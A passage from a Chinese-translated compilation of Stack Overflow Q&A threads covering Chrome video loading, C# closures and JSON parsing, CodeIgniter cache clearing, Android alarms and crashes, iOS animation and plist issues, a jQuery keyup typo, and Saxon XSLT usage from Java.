斯图是正确的。但有时，根据我的经验，Chrome 会忽略 preload="none" 属性并继续打开连接。在开发一个包含许多较小视频的网站时，我遇到了很多问题。连接阻止了其余内容（图像、自定义字体（当自定义字体延迟时，文本甚至不会呈现））我的解决方案是构建一个自己的预加载器来加载图像。这确保我至少可以控制图像（从设计角度来看这是最关键的方面）何时加载。

这解决了图像不显示的问题，但问题仍然存在。所以最好的解决方案是设置指向同一个服务器的子域，比如：v1.server.com、v2.server.com 等等。这意味着您不必移动文件，并且您可以从使浏览器具有更多开放连接中受益。不过要注意增加的 dns 查找时间。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2014-08-16T18:23:17.277

Chrome存在一个[已知错误](https://code.google.com/p/chromium/issues/detail?id=31014)。它不会同时在多个标签中播放相同的视频。如果您是开发人员并且碰巧同时在两个选项卡中打开您的页面，这可能就是您遇到的问题。

在撰写本文时，该错误已为人所知将近 5 年。随意访问[Chromium 错误报告](https://code.google.com/p/chromium/issues/detail?id=31014)并为问题加注星标。希望它会增加 Chrome 开发人员的优先级。

* * *

同时，一种解决方法是在视频 src 中使用随机查询参数。例如，代替`<video src="vid.mp4">`，使用`<video src="vid.mp4?_u=1253412">`。这将破坏 Chrome 的缓存机制，并允许同一视频同时流式传输到两个不同的选项卡。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-07-22T20:36:15.323

我有一个类似但相关的问题，我可以在这里稍微扩展一下。

我在一个页面上有 14 个不同的小视频，但一次只有 2 个可用。设置 preload = 'none' 并没有解决问题，所以我还使用数据属性来存储 src，并删除当前未观看的所有视频的 src。

# c# - 匿名函数体变量保存在哪里？

> ID：10658658
> 
> 赞同：1
> 
> 时间：2012-05-18T19:29:29.270
> 
> 标签：c#, anonymous-function, anonymous-methods

下面的代码可以工作，但为什么？当我在循环中调用匿名方法时，x 和 y 在哪里来/保存。

谢谢

```
 static void Main(string[] args)
    {
        int x=1;
        int y=2;
        var dic = GetDic(x, y);

        for (int i = 0; i < 5;i++ )
        {
            System.Console.WriteLine(dic[i].Invoke().ToString());
        }

    }

    private static Dictionary<int, Func<int>> GetDic(int x, int y)
    {
        var dic = new Dictionary<int, Func<int>>()
        {
            {0,()=>{return y;}},
            {1,()=>{return x;}},
            {2,()=>{return x+y;}},
            {3,()=>{return x-y;}},
            {4,()=>{return y-x;}},
        };
        return dic;
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-18T19:36:08.897

Lambda 表达式被编译成单独的方法。如果它们不使用周围代码中的局部变量，它们将被编译为同一类的方法。但是，当使用局部变量时（如本例所示），编译器会在周围类型中创建一个嵌套类，并将与使用的局部变量匹配的编译方法和字段放在那里。使用 lambda 表达式时，会创建该类的实例，并将值存储在实例字段中，以便 lambda 方法可以访问它们。

这也意味着在 lambda 表达式中使用来自周围方法的局部变量比仅使用其参数和其他类型的静态成员的 lambda 表达式稍微贵一些。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:32:12.823

它们保存在代表`Target`字段中生成的闭包类中。

有关详细信息，请参阅[我的博客文章](http://blog.slaks.net/2011/06/delegates-vs-function-pointers-part-4-c.html)。

# php - Codeigniter 缓存 - 新帖子后刷新的建议

> ID：10658660
> 
> 赞同：5
> 
> 时间：2012-05-18T19:29:39.970
> 
> 标签：php, codeigniter, caching, memcached, outputcache

我有一个基于 CI 2.1.0 构建的博客类型应用程序。当我添加

```
$this->output->cache(5); 
```

对于我的控制器，CI 正确缓存了页面，并且加载速度很快。

我的问题是，如果有人对该帖子发表评论，则该评论将在缓存过期之前显示。

我想知道是否有人有关于如何在每次更改特定页面时强制刷新缓存的指示，或者是否进行了后期编辑等。

提前致谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-18T19:36:32.210

来自 CodeIgniter 文档：

> 如果您不再希望缓存文件，您可以删除缓存标签，当它过期时将不再刷新。注意：删除标签不会立即删除缓存。它必须正常到期。如果您需要提前将其删除，则需要手动将其从缓存文件夹中删除。

对于以编程方式删除缓存文件，您可以使用

[CodeIgniter 缓存助手](https://bitbucket.org/stevenbenner/codeigniter-cache-helper)

这里这个函数会删除缓存文件

```
function delete_cache($uri_string)
    {
        $CI =& get_instance();
        $path = $CI->config->item('cache_path');
        $cache_path = ($path == '') ? APPPATH.'cache/' : $path;

        $uri =  $CI->config->item('base_url').
            $CI->config->item('index_page').
            $uri_string;

        $cache_path .= md5($uri);

        if (file_exists($cache_path))
        {
            return unlink($cache_path);
        }
        else
        {
            return TRUE;
        }
    } 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-18T19:36:46.873

您可以扩展输出类以启用清除页面缓存。看看这里： [https ://github.com/EllisLab/CodeIgniter/wiki/Clear-Page-Cache](https://github.com/EllisLab/CodeIgniter/wiki/Clear-Page-Cache)

# android - 动画期间在 android 2.3.5 上过多的不需要的系统调用 GC

> ID：10658662
> 
> 赞同：5
> 
> 时间：2012-05-18T19:29:43.703
> 
> 标签：android, animation, garbage-collection

在我的应用程序中，我有一个带有两个孩子的 ViewSwitcher，如下所示：

```
<ViewFlipper
    android:id="@+id/galeryviewflipper"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent">

    <RelativeLayout
        android:layout_width="fill_parent"
        android:layout_height="fill_parent">            
        <ImageView
            android:id="@+id/galeryimageview_0"
            android:layout_width="fill_parent"
            android:layout_height="fill_parent"
            android:scaleType="fitCenter"
        />
    (... other stuff here)
    </RelativeLayout>

    <RelativeLayout>
    (... copy previous except for IDs)              
    </RelativeLayout>               
</ViewFlipper> 
```

然后我正在切换画廊图片（每张都是一张大约 800x600 的照片）：

```
//(setup wanted images into ImageViews)
//then:
viewFlipper.setInAnimation(instance, R.anim.fade_in);
viewFlipper.setOutAnimation(instance, R.anim.fade_in);
viewFlipper.setDisplayedChild(nextIndex); 
```

在 android 2.3.4 上一切都按预期进行，但在 2.3.5 手机（galaxy S2）上，dalvik 在动画期间调用了几次 GC，这导致了草率的用户体验（注意 GC 时间和持续时间！）。我没有在应用程序的任何地方明确调用 System.gc。

```
05-18 21:06:56.040: D/dalvikvm(6617): GC_EXTERNAL_ALLOC freed <1K, 50% free 5447K/10695K, external 17083K/17815K, paused 30ms
05-18 21:06:56.115: D/dalvikvm(6617): GC_EXTERNAL_ALLOC freed <1K, 50% free 5447K/10695K, external 17083K/17815K, paused 30ms
05-18 21:06:56.175: D/dalvikvm(6617): GC_EXTERNAL_ALLOC freed <1K, 50% free 5447K/10695K, external 17083K/17815K, paused 31ms
05-18 21:06:56.245: D/dalvikvm(6617): GC_EXTERNAL_ALLOC freed <1K, 50% free 5447K/10695K, external 17083K/17815K, paused 30ms
05-18 21:06:56.305: D/dalvikvm(6617): GC_EXTERNAL_ALLOC freed <1K, 50% free 5447K/10695K, external 17083K/17815K, paused 31ms
05-18 21:06:56.365: D/dalvikvm(6617): GC_EXTERNAL_ALLOC freed <1K, 50% free 5447K/10695K, external 17083K/17815K, paused 30ms
05-18 21:06:56.415: D/dalvikvm(6617): GC_EXTERNAL_ALLOC freed <1K, 50% free 5447K/10695K, external 17083K/17815K, paused 32ms 
```

它也在另一部 2.2+ 手机（不是 Galaxy s2）上做同样的事情，所以在一部手机上总共没有 GC 调用，在另外两部手机上会发生这种情况。而且，OK 手机的功能远没有 Galaxy S2 强大，并且由于动画期间没有 GC 调用，仍然显示平滑的淡入淡出。有什么建议么？感谢帮助。

这绝对不是内存不足造成的，在 Galaxy S2 上，在此过程中使用了 64MB 堆中的 5MB。它似乎与实际的堆使用无关，每次都会发生。

# android - 即使应用程序关闭，如何弹出警报

> ID：10658666
> 
> 赞同：1
> 
> 时间：2012-05-18T19:29:56.863
> 
> 标签：android, android-alertdialog

我正在开发一个基于位置的警报，它是一个 Android 应用程序。

所有的编码部分已经完成。

但是当应用程序关闭时，警报警报对话框不会显示。

请帮助我，即使用户正在使用另一个应用程序或在主屏幕中，我也会尝试弹出警报。

我现在的闹钟代码如下所示：

```
final MediaPlayer mp = MediaPlayer.create(LocAlarmProject.this, R.raw.airtel); 

mp.start();         

// LocAlarmProject.this below is what's causing the problem:
final AlertDialog.Builder builder=new AlertDialog.Builder(LocAlarmProject.this);

builder.setTitle(disp_title);

builder.setMessage(disp_desc);

builder.setIcon(R.drawable.alarm);

builder.setPositiveButton("OK", new DialogInterface.OnClickListener() {

public void onClick(DialogInterface dialog, int which) {                        

     mp.stop();

}

 });

 builder.show(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T20:04:33.117

我很确定您正在寻找[服务。](http://developer.android.com/reference/android/app/Service.html)

复制并粘贴：

> 服务是一个应用程序组件，代表应用程序希望在不与用户交互的情况下执行更长时间运行的操作，或提供功能供其他应用程序使用。每个服务类必须在其包的 AndroidManifest.xml 中有相应的声明。可以使用 Context.startService() 和 Context.bindService() 启动服务。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-10T08:16:22.187

使用通知服务来跟踪状态.....访问...... [http://developer.android.com/guide/topics/ui/notifiers/notifications.html](http://developer.android.com/guide/topics/ui/notifiers/notifications.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-18T20:40:38.823

执行此操作的正确方法需要几个步骤。抱歉，如果您以前没有做过，这并非易事：

首先，您将使用 Android 的内置功能`AlarmManager`来安排您希望激活应用的时间。您安排了一个新的闹钟，其中包含起床时间和`PendingIntent`.

其次，创建`PendingIntent`用于激活您的应用程序以显示警报的时间。

第三，你可以通过几种方式来处理这个Intent，最常见的是创建一个扩展类`BroadcastReceiver`来接收Intent。当该显示警报时，会通知此类。您创建并放入 PendingIntent 的 Intent 将传递给它的`onReceive()`方法。您将此信息传递给您的应用程序以显示警报对话框。--- 您也可以只注册您的主应用程序以接收 Intent，然后`onNewIntent(Intent)`在您的 Activity 中覆盖该方法。

四，`BroadcastReceiver`在您的`AndroidManifest.xml`文件中注册您的。这也是注册此接收器以侦听您创建的 Intent 的地方。您可以使用`<intent-filter>`标签执行此操作。

五，（可选）如果您希望即使手机处于睡眠状态也能显示闹钟，并且您想确保在用户确认闹钟之前它不会重新进入睡眠状态，您需要获取 WAKE_LOCK 来执行所以。

这比使用服务更可取的原因是它不会仅仅为了等待警报而消耗资源，而且如果 Android 决定终止您的应用程序以释放内存，它仍然可以工作。祝你好运，编码愉快！

# android - android：当我点击返回按钮时应用程序崩溃（活动组+ TabWidget）

> ID：10658667
> 
> 赞同：4
> 
> 时间：2012-05-18T19:30:10.357
> 
> 标签：android, tabbar, back, activitygroup

每个人！

一年前，我开发了一个“ActivityGroup + TabWidget”组合的应用程序，它在android os 2.3+ 上运行良好。但我在 os 4.0 上对其进行了测试，我发现它有时会崩溃。- 如果我打开应用程序，我什么也不做，然后我点击“返回”，它运行良好。- 如果我打开应用程序，在应用程序中导航（单击列表项，查看详细项然后返回），然后当我返回选项卡的“根”页面时，单击“返回”，它会崩溃。（它应该正常关闭应用程序）--------在这种情况下，活动组启动新活动并收到返回键事件 - 如果我打开应用程序，请像上面一样在应用程序中导航，但只是看到未启动的视图按活动组，但按组中的根活动。我运作良好。

我的 ActivityGroup 中有一些代码

```
public void startActivity(Intent intent) {
// Start the root activity withing the group and get its view
    View view = getLocalActivityManager().startActivity(id, intent)
                                        .getDecorView();
    // Replace the view of this ActivityGroup
    replaceView(view);
}

public void back() {
    if(history.size() > 1) {  //history = new ArrayList<View>(); global variable
        history.remove(history.size()-1);
        setContentView(history.get(history.size()-1));

        mIds.pop();
    }else {
        finish();    // I tried to commment it too, but no lucks
    }
}

@Override
public boolean onKeyDown(int keyCode, KeyEvent event)  {
    if (keyCode == KeyEvent.KEYCODE_BACK) {
        back();

        return true;
    }

    return super.onKeyDown(keyCode, event);
} 
```

还有错误堆栈：

```
05-18 18:47:47.687: E/AndroidRuntime(6828): FATAL EXCEPTION: main
05-18 18:47:47.687: E/AndroidRuntime(6828): java.lang.IllegalStateException: Can not                 perform this action after onSaveInstanceState
05-18 18:47:47.687: E/AndroidRuntime(6828):     at android.app.FragmentManagerImpl.checkStateLoss(FragmentManager.java:1213)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at     android.app.FragmentManagerImpl.popBackStackImmediate(FragmentManager.java:442)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at android.app.Activity.onBackPressed(Activity.java:2121)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at android.app.Activity.onKeyUp(Activity.java:2099)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at android.view.KeyEvent.dispatch(KeyEvent.java:2557)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at android.app.Activity.dispatchKeyEvent(Activity.java:2329)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at com.android.internal.policy.impl.PhoneWindow$DecorView.dispatchKeyEvent(PhoneWindow.java:1806)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at android.view.ViewGroup.dispatchKeyEvent(ViewGroup.java:1248)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at android.view.ViewGroup.dispatchKeyEvent(ViewGroup.java:1248)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at android.view.ViewGroup.dispatchKeyEvent(ViewGroup.java:1248)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at com.android.internal.policy.impl.PhoneWindow$DecorView.superDispatchKeyEvent(PhoneWindow.java:1859)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at com.android.internal.policy.impl.PhoneWindow.superDispatchKeyEvent(PhoneWindow.java:1361)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at android.app.Activity.dispatchKeyEvent(Activity.java:2324)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at com.android.internal.policy.impl.PhoneWindow$DecorView.dispatchKeyEvent(PhoneWindow.java:1806)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at android.view.ViewGroup.dispatchKeyEvent(ViewGroup.java:1248)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at android.view.ViewGroup.dispatchKeyEvent(ViewGroup.java:1248)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at android.view.ViewGroup.dispatchKeyEvent(ViewGroup.java:1248)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at android.widget.TabHost.dispatchKeyEvent(TabHost.java:298)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at android.view.ViewGroup.dispatchKeyEvent(ViewGroup.java:1248)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at android.view.ViewGroup.dispatchKeyEvent(ViewGroup.java:1248)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at android.view.ViewGroup.dispatchKeyEvent(ViewGroup.java:1248)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at com.android.internal.policy.impl.PhoneWindow$DecorView.superDispatchKeyEvent(PhoneWindow.java:1859)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at com.android.internal.policy.impl.PhoneWindow.superDispatchKeyEvent(PhoneWindow.java:1361)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at android.app.Activity.dispatchKeyEvent(Activity.java:2324)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at com.android.internal.policy.impl.PhoneWindow$DecorView.dispatchKeyEvent(PhoneWindow.java:1806)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at android.view.ViewRootImpl.deliverKeyEventPostIme(ViewRootImpl.java:3300)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at android.view.ViewRootImpl.handleFinishedEvent(ViewRootImpl.java:3273)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at android.view.ViewRootImpl.handleMessage(ViewRootImpl.java:2436)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at android.os.Handler.dispatchMessage(Handler.java:99)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at android.os.Looper.loop(Looper.java:137)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at android.app.ActivityThread.main(ActivityThread.java:4340)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at java.lang.reflect.Method.invokeNative(Native Method)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at java.lang.reflect.Method.invoke(Method.java:511)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
05-18 18:47:47.687: E/AndroidRuntime(6828):     at dalvik.system.NativeStart.main(Native Method) 
```

我没有使用 Fragment，因为当我开发这个应用程序时，它不是由 android sdk 发布的。

有任何想法吗？每一个想法都将不胜感激！！
谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-11T06:45:17.607

您可以使用它`onBackPressed()`来达到您想要的效果，您可以通过以下方式使用它。

```
public void onBackPressed(){
  //Your code here
  super.onBackPressed();
} 
```

**最重要的是确保您已在您的活动组中使用的所有子活动中实施此方法。**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-09T20:57:54.830

您可以帮助此代码：

```
@Override
protected void onSaveInstanceState(Bundle outState) {
    outState.putString("WORKAROUND_FOR_BUG_19917_KEY", "WORKAROUND_FOR_BUG_19917_VALUE");
    super.onSaveInstanceState(outState);
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-18T19:47:37.747

而不是这样做：

`if (keyCode == KeyEvent.KEYCODE_BACK)`

您可以尝试通过覆盖来处理后按按钮

`public void onBackPressed() {}`

并在其中编写您的代码。

# c# - 在哪里可以找到用于 C# 的简单但灵活的 JSON 解析器？

> ID：10658669
> 
> 赞同：1
> 
> 时间：2012-05-18T19:30:11.707
> 
> 标签：c#, json

我需要将一些 JSON 解析为 C# 中的对象。我看过 Newtonsoft 和 JavaScriptSerializer，但要么我不知道如何很好地使用它们，要么它们在处理可能会改变并且对于复杂结构来说很尴尬的格式方面做得很差。我想要一些我可以做的事情：

```
JsonObject j = Deserialize(mystring);
String[] earthColors = j.maps["earth"].colors; 
```

并且不关心结构的其余部分。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-18T21:31:58.280

我认为你应该重新考虑不使用[Json.Net](http://json.codeplex.com/)

```
string mystring = 
    @"
    {
        ""maps"": {
            ""earth"": {
                ""colors"": [
                    ""blue"",
                    ""green""
                ]
            },
            ""moon"": {
                ""colors"": [
                    ""black"",
                    ""white""
                ]
            }
        }
    ";

dynamic j = JsonConvert.DeserializeObject(mystring);
foreach (var c in j.maps["earth"].colors)
{
    Console.WriteLine(c);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T19:35:15.143

## 静态类方法

这是将 JSON 转换为对象的通用方法（一定要包含`System.Web.Script.Serialization`）：

```
 public static T JsonToObject<T>(string JsonData)
    {
        // Deserialize the JSON into the object
        JavaScriptSerializer jss = new JavaScriptSerializer();
        T rf = (T)jss.Deserialize(JsonData, typeof(T));

        return rf;
    } 
```

要将对象转换回 JSON，请使用以下通用方法：

```
 public static string ObjectToJson<T>(T rf)
    {
        // Serialize the object as JSON
        StringBuilder sb = new StringBuilder();
        JavaScriptSerializer jss = new JavaScriptSerializer();
        jss.Serialize(rf, sb);

        return sb.ToString();
    } 
```

要使用它，您只需创建与 JSON 响应匹配的类，然后调用该`JsonToObject`方法。

```
JsonObject j = JsonToObject(mystring); 
```

* * *

## 动态方法

对于更动态的方法，您需要查看以下内容：

```
JavaScriptSerializer jss = new JavaScriptSerializer();
var JsonObject = jss.Deserialize<dynamic>(mystring); 
```

这将`JsonObject`动态创建，然后您可以使用`Dictionary`样式访问器，而不必预先创建类。因此，对于给定的 JSON 响应

```
{ "maps": ["earth": {"colors": ["purple","chartreuse"] }] } 
```

c 类将被动态创建，可以作为访问

```
JsonObject.maps["earth"].colors[0] == "purple";
JsonObject.maps["earth"].colors[1] == "chartreuse"; 
```

# c# - 向事件添加微不足道的处理程序会导致大量开销吗？

> ID：10658671
> 
> 赞同：2
> 
> 时间：2012-05-18T19:30:17.230
> 
> 标签：c#

从这个[问题](https://stackoverflow.com/questions/289002/how-to-raise-custom-event-from-a-static-class)的答案内容中我学到了一个新技巧；为事件添加一个简单的处理程序，以避免在引发事件时检查空值。

```
public static event EventHandler SomeEvent = delegate {}; 
```

并在没有空检查的情况下调用它：

```
SomeEvent(null,EventArgs.Empty); 
```

这是否会增加大量开销？如果没有，为什么不内置这样的东西？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T19:32:08.080

> 这是否会增加大量开销？如果没有，为什么不内置这样的东西？

它不会增加*显着*的开销 - 只是在引发事件时进行委托调用。

至于为什么它不是内置的 - 有几个缺点：

1.  这不一定是防弹的 - 您仍然可以[在之后清除处理程序列表](https://stackoverflow.com/questions/91778/how-to-remove-all-event-handlers-from-a-control)，在这种情况下，您仍然需要适当的检查。
2.  这确实增加了开销——虽然很小，但在特定情况下，开销可能是有问题的。

# iphone - 存储在 /Library/MyAppData/userstatus.plist 的文件 (.plist) 在发布版本中不断被删除。这是怎么回事？

> ID：10658673
> 
> 赞同：0
> 
> 时间：2012-05-18T19:30:30.310
> 
> 标签：iphone, build, plist, release

我在这里遇到了一个奇怪的问题。我将一些用户信息保存在一个名为“userstatus.plist”的文件中，该文件保存在我的应用程序的 /Library/MyAppData/userstatus.plist 文件夹位置。

在我的应用程序中，我使用以下命令检查文件是否存在：

```
- (void)checkFile {
    NSString *statusPath = [self statusPath];
    if ([[NSFileManager defaultManager] fileExistsAtPath:statusPath]) {
        NSLog(@"Reading user status from file");
        _userStatus = [[NSMutableArray alloc] initWithContentsOfFile:statusPath];
    }
    else {
        NSLog(@"Creating new user status");
        _userStatus = [[NSMutableArray alloc] init];
    }
}

- (NSString*)statusPath {
    return [[self libraryPath] stringByAppendingPathComponent:@"MyAppData/userstatus.plist"];
}

- (NSString*)libraryPath {
    NSString* path = [NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES) objectAtIndex:0];
    return path;
} 
```

每当我在调试版本中测试我的应用程序时，我只会在第一次构建时收到一次“正在创建新用户状态”消息。在随后的构建中，我收到“从文件中读取用户状态”消息。

但是，当我切换到发布版本时，我会不断收到我所做的每个版本的“正在创建新用户状态”消息，基本上清除了我存储的所有用户数据。

任何帮助将不胜感激，因为我无能为力......谢谢！:)

编辑：我在模拟器上运行了发布版本，这样我就可以在我的 finder 窗口上查看该位置 (/Library/MyAppData/) 的情况。原来 plist 文件从未创建过，这很奇怪。我确实有其他文件可以毫无问题地创建。只有 plist 文件不会被创建。希望这应该有助于获得解决方案？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T20:46:40.633

很抱歉在这里浪费了任何人的时间。该解决方案与我提出问题时的想法无关。在开发过程中，我`NSAssert`在将文件写入该位置的行上使用了一个；我忘记了`NSAssert`s 在发布版本中被跳过了。

对不起大家，我的坏。不过，如果它可以帮助任何人（以任何可能的方式），我将把这个问题留下来。

# ios - 当有很多 UIView 动画使用 UILabels 运行时，设备会冻结，我按下 Home 按钮

> ID：10658675
> 
> 赞同：0
> 
> 时间：2012-05-18T19:30:43.320
> 
> 标签：ios, core-animation, freeze, springboard

我在我的应用程序中遇到了一些问题。当我在一个有很多图标（UIViews）的屏幕中发生错误时，每个图标都运行一个动画。这个画面让人想起跳板画面，动画视觉也类似。

所以，如果我按下主页按钮，应用程序不会进入后台，我什么也做不了。甚至电源按钮也不起作用。图标继续抖动。

如果我删除了对标签创建方法的调用，则不会发生这种情况。

有什么建议吗？

谢谢！

动画方法（提取自 Three20 api）：

```
- (void)wobble {
    static BOOL wobblesLeft = NO;

    if (isEditing)
    {
        CGFloat rotation = (kWobbleRadians * M_PI) / 180.0;
        CGAffineTransform wobbleLeft = CGAffineTransformMakeRotation(rotation);
        CGAffineTransform wobbleRight = CGAffineTransformMakeRotation(-rotation);

        [UIView beginAnimations:nil context:nil];

        NSInteger i = 0;
        NSInteger nWobblyButtons = 0;

        for(Icon *ic in iconList)
        {
            ++nWobblyButtons;
            i++;
            if (i % 2)
            {
                ic.transform = wobblesLeft ? wobbleRight : wobbleLeft;

            } else {
                ic.transform = wobblesLeft ? wobbleLeft : wobbleRight;
            }
        }

        if (nWobblyButtons >= 1)
        {
            [UIView setAnimationDuration:kWobbleTime];
            [UIView setAnimationDelegate:self];
            [UIView setAnimationDidStopSelector:@selector(wobble)];
            wobblesLeft = !wobblesLeft;

        } else {
            [NSObject cancelPreviousPerformRequestsWithTarget:self];
            [self performSelector:@selector(wobble) withObject:nil afterDelay:kWobbleTime];
        }

        [UIView commitAnimations];
    }
} 
```

标签创建

```
-(void)layoutLabel
{
    // If title isn`t builded.
    if(_lblName == nil)
    {
        // Create new label.
        _lblName = [[UILabel alloc] initWithFrame:CGRectMake(LABEL_POS_X,
                                                             LABEL_POS_Y,
                                                             LABEL_WIDTH,
                                                             LABEL_HEIGHT)];

        // Clear the background.
        [_lblName setBackgroundColor:[UIColor clearColor]];

        // Sets the font.
        [_lblName setFont:[UIFont fontWithName:@"Helvetica-Bold" size:11.3]];
        [_lblName setAdjustsFontSizeToFitWidth:NO];

        // Sets text color
        [_lblName setTextColor:[UIColor whiteColor]];

        // Adjust the number of lines.
        [_lblName setNumberOfLines:2];

        // Adjust the aligment to center.
        [_lblName setTextAlignment:UITextAlignmentCenter];

        // Adjust shadow like the springboad`s icons.
        _lblName.layer.shadowOpacity = 1.0;
        _lblName.layer.shadowRadius = 0.8;
        _lblName.layer.shadowColor = [[UIColor blackColor] CGColor];
        _lblName.layer.shadowOffset = CGSizeMake(0, 1.2);

        // Add label to container.
        [self addSubview:_lblName];
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-21T19:28:08.967

问题是：

对于每个图标，我有很多子视图，因此，在动画时间对每个图标的计算会导致代码缓慢。

所以，我找到了一些解决这个问题的方法。我构建了相同的图标结构，但是之后，我将 UIImage 中的所有内容与下面的代码合并。

```
+ (UIImage *) imageWithView:(UIView *)view
{
    UIGraphicsBeginImageContextWithOptions(view.bounds.size, view.opaque, 0.0);
    [view.layer renderInContext:UIGraphicsGetCurrentContext()];

    UIImage * img = UIGraphicsGetImageFromCurrentImageContext();

    UIGraphicsEndImageContext();

    return img;
} 
```

这将我的 FPS 从 ~15 提高到 60 Oo

遵循我找到的一些帮助 [链接](https://stackoverflow.com/questions/4334233/how-to-capture-uiview-to-uiimage-without-loss-of-quality-on-retina-display)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-19T17:36:02.310

阴影的动画效果并不好。在动画期间禁用它们并在动画完成后重新打开它们。

使用阴影制作动画时我没有冻结，但性能非常不稳定。以我的经验，尝试为任何有阴影的东西制作动画会产生不可接受的结果。

# jquery - jQuery textarea keyUp 正在破坏以下所有代码

> ID：10658679
> 
> 赞同：0
> 
> 时间：2012-05-18T19:30:54.900
> 
> 标签：jquery, textarea, keyup

我觉得我可能在这里忽略了一些东西。我想`<span>`在`<textarea>`. 我正在使用以下 jQuery 和 HTML：

jQuery：

```
$('#ws3 .textarea textarea[name="company-description"]').keyUp(function() {

var charLength = $(this).val().length;

$('span#charCount').html(charLength + ' of 250 characters used');

if($(this).val().length > 250)
$('span#charCount').html('<strong>You may only have up to 250 characters.</strong>');

}); 
```

HTML：

```
<div id="ws3" class="ws-section">
<label for="company-description">Describe your company for us</label>
<div class="textarea">
  <textarea id="company-description" name="company-description" class="ws-required"></textarea>
</div>
<span id="charCount">charCount</span>
</div> 
```

此外，此块后面的所有 jQuery 代码都不起作用，几乎就像浏览器已停止读取此代码块处的 .js 文件一样。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-18T19:32:17.360

没有`keyUp`功能..将其更改为`keyup`然后它应该可以正常工作..

```
$('#ws3 .textarea textarea[name="company-description"]').keyup(function() { 
```

[**演示**](http://jsfiddle.net/skram/gJDJJ/)

**提示：**

1.  当出现脚本错误时，Javascript 编译器将停止执行错误行下方的以下行并继续执行下一个`js`文件或下一个`<script>`块
2.  将来，每当您遇到脚本问题时，请查看控制台是否有错误。以下是我使用时得到的`keyUp`

> **错误：** $("#ws3 .textarea textarea[name=\"company-description\"]").keyUp 不是函数

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-18T19:37:11.983

jQuery中没有`keyUp`函数，函数名是[`keyup`](http://api.jquery.com/keyup/)

[工作演示](http://jsfiddle.net/joycse06/csM3L/)

# java - Java 中的撒克逊人：用于 CSV 到 XML 的 XSLT

> ID：10658681
> 
> 赞同：2
> 
> 时间：2012-05-18T19:31:02.077
> 
> 标签：java, xml, xslt, csv, saxon

主要从这个问题继续：[XSLT: CSV (or Flat File, or Plain Text) to XML](https://stackoverflow.com/questions/10655762/xslt-csv-or-flat-file-or-plain-text-to-xml)

所以，我从这里有一个 XSLT：http: [//andrewjwelch.com/code/xslt/csv/csv-to-xml_v2.html](http://andrewjwelch.com/code/xslt/csv/csv-to-xml_v2.html)

并将 CSV 文件转换为 XML 文档。在命令行上与以下命令一起使用时会执行此操作：

> java -jar saxon9he.jar -xsl:csv-to-xml.csv -it:main -o:output.xml

所以现在问题变成了：**我如何在我的 Java 代码中做到这一点？**

现在我有如下代码：

```
TransformerFactory transformerFactory = TransformerFactory.newInstance();
StreamSource xsltSource = new StreamSource(new File("location/of/csv-to-xml.xsl"));
Transformer transformer = transformerFactory.newTransformer(xsltSource);
StringWriter stringWriter = new StringWriter();
transformer.transform(documentSource, new StreamResult(stringWriter));
String transformedDocument = stringWriter.toString().trim(); 
```

（`Transformer`是 的一个实例`net.sf.saxon.Controller`。）

命令行的诀窍是指定“-it:main”以指向 XSLT 中的命名模板。这意味着您不必为源文件提供“-s”标志。

